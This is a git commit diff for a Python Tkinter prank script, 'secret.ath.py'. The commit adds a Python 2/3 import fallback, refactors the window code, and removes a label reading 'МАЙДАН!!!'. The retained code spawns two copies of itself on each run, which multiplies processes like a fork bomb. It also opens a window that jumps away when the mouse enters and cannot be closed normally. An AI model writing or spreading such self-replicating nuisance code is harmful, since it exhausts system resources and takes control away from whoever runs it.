143d1d60f568b0c198bef92c2e304cd261619058
zaxdo <Y8916687@yandex.ru>
2014-05-24 21:53:41 +0400

    Update secret.ath.py

--- AZabolotskikh/secret.ath.py
+++ AZabolotskikh/secret.ath.py
@@ -1,5 +1,9 @@
+#/usr/bin/env python
 # -*- coding: utf8 -*-
-import Tkinter as t;
+try: 
+	import Tkinter as t;
+except:
+	import tkinter as t;
 from random import randrange;
 import sys;
 import subprocess;
@@ -11,8 +15,7 @@ if not "CAFEDEAD" in sys.argv:
 		subprocess.Popen(["python.exe", "-O",__file__] + sys.argv[1:], shell=False)
 		subprocess.Popen(["python.exe", "-O",__file__] + sys.argv[1:], shell=False)
 root = t.Tk();
-text = t.Label(root, text = u"МАЙДАН!!!");
-text.pack();
-root.bind("<Enter>", lambda event: root.geometry(str(randrange(400)) + "x" + str(randrange(400)) + "+" + str(randrange(1000)) + "+" + str(randrange(1000))));
-root.protocol("WM_DELETE_WINDOW", lambda: root.geometry(str(randrange(400)) + "x" + str(randrange(400)) + "+" + str(randrange(1000)) + "+" + str(randrange(1000))));
+e = lambda event: root.geometry(str(randrange(400)) + "x" + str(randrange(400)) + "+" + str(randrange(1000)) + "+" + str(randrange(1000)))
+root.bind("<Enter>", e);
+root.protocol("WM_DELETE_WINDOW", e);
 root.mainloop();
